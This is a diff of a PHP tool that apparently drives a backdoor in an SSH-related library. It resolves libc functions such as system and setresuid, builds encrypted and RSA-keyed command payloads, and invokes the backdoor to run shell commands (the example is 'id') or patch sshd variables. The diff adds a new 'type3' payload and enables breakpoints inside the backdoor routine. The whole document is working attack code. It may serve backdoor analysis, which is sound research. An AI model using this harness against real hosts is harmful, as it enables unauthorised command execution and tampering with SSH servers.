@@ -49,13 +49,13 @@ function secret_data_crypto(string $data, int $op){
         : openssl_decrypt($data, 'chacha20', $key, OPENSSL_RAW_DATA, $iv);
 }
 
-function encode_data(int $size, $data){
+function encode_data(int $size, int $data){
     switch($size){
         case 1: return pack('C', $data);
         case 2: return pack('v', $data);
         case 4: return pack('V', $data);
         case 8: return pack('P', $data);
-        default: return $data;
+        default: throw new InvalidArgumentException("unsupported size {$size}");
     }
 }
 
@@ -178,7 +178,8 @@ class Invoker {
         /** init libc functions  */
         foreach([
             'getuid', 'exit', 'malloc_usable_size',
-            'setresuid', 'setresgid', 'system'
+            'setresuid', 'setresgid', 'system', 'pselect', 'setlogmask',
+            '__errno_location'
         ] as $fn){
             $addr = $this->dlsym($fn);
             if($addr == null) throw new RuntimeException();
@@ -288,6 +289,8 @@ class Invoker {
     }
 
     private function payload_make_header(int $cmd_type){
+        // cmd_type = (a * b) + c
+        // both `a` and `b` must be non-zero
         return pack('VVP', 1, $cmd_type, 0);
     }
 
@@ -329,6 +332,15 @@ class Invoker {
             . $payload_hdr
             . $payload_body_encrypted
         );
+    }
+
+    private function payload_make_type3(){
+        $cmd_type = 3;
+        $packet = (''
+            . $this->payload_make_args(0, 0xC0, 0, 0)
+            . str_repeat("\x00", 0x30)
+        );
+        return $this->payload_make($cmd_type, $packet);
     }
 
     private function payload_make_exec(string $shell_cmd){
@@ -388,6 +400,11 @@ class Invoker {
         say("res: {$res}, run_orig: {$run_orig}");
 
         $this->nat_RSA_free($payload_rsa_key);
+    }
+
+    public function cmd_type3(){
+        $payload = $this->payload_make_type3();
+        $this->backdoor_invoke($payload);
     }
 
     public function cmd_patch_sshd(){
@@ -519,14 +536,18 @@ $jmp_exit = [
     $run_backdoor_commands+0x161, $run_backdoor_commands+0x177,
     $run_backdoor_commands+0xD3E, $run_backdoor_commands+0xD75,
 ];
-$breakpoints = array_unique([...$jmp_bad_data, /*...$jmp_disable_backdoor, ...$jmp_exit*/]);
-//$invoker->debug_place_breakpoints(...$breakpoints);
+$breakpoints = array_unique([...$jmp_bad_data, ...$jmp_disable_backdoor, ...$jmp_exit]);
+$invoker->debug_place_breakpoints(...$breakpoints);
 //$invoker->debug_place_breakpoints();
-
 //$invoker->debug_place_breakpoints(0x993C);
+
+/*
 print(" ... running system command ...\n");
 $invoker->cmd_system('id');
 
 print(" ... patching sshd variables ...\n");
 $invoker->cmd_patch_sshd();
 print(" done!\n");
+*/
+
+$invoker->cmd_type3();
